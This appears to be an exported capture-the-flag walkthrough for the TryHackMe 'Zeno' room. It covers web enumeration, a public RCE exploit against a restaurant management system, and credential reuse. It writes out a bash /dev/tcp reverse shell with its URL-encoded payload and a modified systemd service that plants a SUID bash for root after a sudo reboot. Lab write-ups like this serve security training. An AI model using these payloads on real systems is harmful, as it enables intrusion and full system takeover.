<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>zeno</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>zeno</h1><br/><p><strong><h1>THM: Zeno</h1></strong></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong><h4>Nmap</h4></strong></p><p></p><p><img src="images/71-1.png" alt="images/71-1.png" /></p><p></p><p><strong><h4>Website Enmueration</h4></strong></p><p><strong><h5>Browser</h5></strong></p><p><img src="images/71-2.png" alt="images/71-2.png" /></p><p></p><p>It seems the site is in development. Lets enumerate further.</p><p></p><p><strong><h4>Dirsearch</h4></strong></p><p><img src="images/71-3.png" alt="images/71-3.png" /></p><p></p><p>We found a new directory named <strong>rms</strong>.</p><p></p><p>Lets enumerate further.</p><p></p><p><strong><h4>Browser</h4></strong></p><p></p><p><img src="images/71-4.png" alt="images/71-4.png" /></p><p></p><p>We found a fully fleged RMS (Restaurant Management System)</p><p>Now, we clicked on Administrator &amp; landed on a login page. But we do not have any credentials.</p><p></p><p><img src="images/71-5.png" alt="images/71-5.png" /></p><p></p><p>We created an account, logged in and viewed the website but no initial entry was found.</p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>However, upon searching for “Restaurant Management System” in searchsploit we found that it might have RCE vulnerability.</p><p></p><p><img src="images/71-6.png" alt="images/71-6.png" /></p><p></p><p>Lets get the python file &amp; run it.</p><p><img src="images/71-7.png" alt="images/71-7.png" /></p><p></p><p>Upon inspecting the exploit, we find that a cmd parameter is passed in the <em><strong>shell.php</strong></em> which can be later called using <em><strong>shell.php?cmd=xxxx</strong></em></p><p>I tried to put an enitre php reverse shell in the between the &lt;?php &amp; ?&gt;. But it didn&#39;t work due to encoding issue. We will continue with the above.</p><p></p><p><strong>Note: </strong>We have removed the proxy part from the downloaded exploit to make it work as my environment do not have proxy.</p><p></p><p>Running the exploit.</p><p><img src="images/71-8.png" alt="images/71-8.png" /></p><p></p><p>Next, we will use the URL provided with <strong>cmd</strong> parameter to get RCE.</p><p></p><p><img src="images/71-9.png" alt="images/71-9.png" /></p><p></p><p>Thus, we have RCE on the server.. Lets get a reverse shell using bash.</p><p></p><p>We take a bash reverse shell &amp; send it to cmd parameter after encoding it properly.</p><p></p><p><em><strong><small>/bin/bash</small></strong></em><em> -i &gt;&amp; /dev/tcp/</em><em><strong><small>10.17.5.85</small></strong></em><em>/</em><em><strong><small>9000</small></strong></em><em> 0&gt;&amp;1</em></p><p></p><p>We encoded it with online URLEncoder (<strong>https://www.urlencoder.org/</strong>)</p><p></p><p><em>%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.17.5.85%2F9000%200%3E%261</em></p><p></p><p>Final Payload:</p><p><em>http://10.10.148.125:12340/rms/images/reverse-shell.php?cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.17.5.85%2F9000%200%3E%261</em></p><p></p><p><img src="images/71-10.png" alt="images/71-10.png" /></p><p></p><p><strong><h2>Lateral Movement</h2></strong></p><p></p><p><img src="images/71-11.png" alt="images/71-11.png" /></p><p></p><p>We enumerated the system for lateral movement. We now know there is a user named <em><strong>edward</strong></em></p><p>We found a <em><strong>secret-share</strong></em> in <em><strong>/mnt </strong></em>but its empty</p><p></p><p>May be something was mounted which is removed now. We checked the /etc/fstab file &amp; found a commented mount string containing credentials for user <em><strong>zeno</strong></em></p><p><img src="images/71-12.png" alt="images/71-12.png" /></p><p></p><p>We use the same password for user edward in SSH and we were successful. The user flag was found in the home directory of the user.</p><p></p><p><img src="images/71-13.png" alt="images/71-13.png" /></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>We checked for <strong>SUDO</strong> permissions and found the Edward user has <strong>SUDO</strong> permission over <strong>REBOOT</strong></p><p></p><p>This Privilege Escalation of Reboot with sudo is not avaialable in GTFObins. We searched online &amp; found a way.</p><p></p><p><strong><h4>The concept is as follows:</h4></strong></p><p>Ref: <strong>https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/</strong></p><p></p><p>We will find a service that is writabel by our user edward.</p><p>Then we will modify the service to run a root command (say setting a suid to a bash file). Then make necessary changes in the service so that it runs at startup.</p><p>Then we reboot the system with SUDO to run our command as the service will be run by root after reboot.</p><p></p><p></p><p><em>find / -writable -name &quot;*.service&quot; 2&gt;/dev/null</em></p><p></p><p><img src="images/71-14.png" alt="images/71-14.png" /></p><p></p><p>As we can see, user edward has write access to the <em><strong>zeno-monitoring</strong></em> service.</p><p></p><p>We modify the service as follows:</p><p></p><p><em># /etc/systemd/systm/example.service</em></p><p><em>[Unit]</em></p><p><em>Description=Zeno monitoring</em></p><p><em></em></p><p><em>[Service]</em></p><p><em>Type=simple</em></p><p><em>User=root</em></p><p><em>ExecStart=/bin/bash -c &#39;cp /bin/bash /home/edward/bash; chmod +xs /home/edward/bash&#39;</em></p><p><em></em></p><p><em>[Install]</em></p><p><em>WantedBy=multi-user.target</em></p><p></p><p>Now, we run the reboot command with sudo. After the reboot the user&#39;s home directory would contain a setuid set bash binary.</p><p></p><p></p><p><img src="images/71-15.png" alt="images/71-15.png" /></p><p></p><p>We wait for the system to be up again &amp; SSH to edward user to see the results.</p><p></p><p><img src="images/71-16.png" alt="images/71-16.png" /></p><p></p><p></p><p>We have root access. We got the root flag as shown above.</p><p></p><p>Thanks !!</p></div>
</body>
</html>
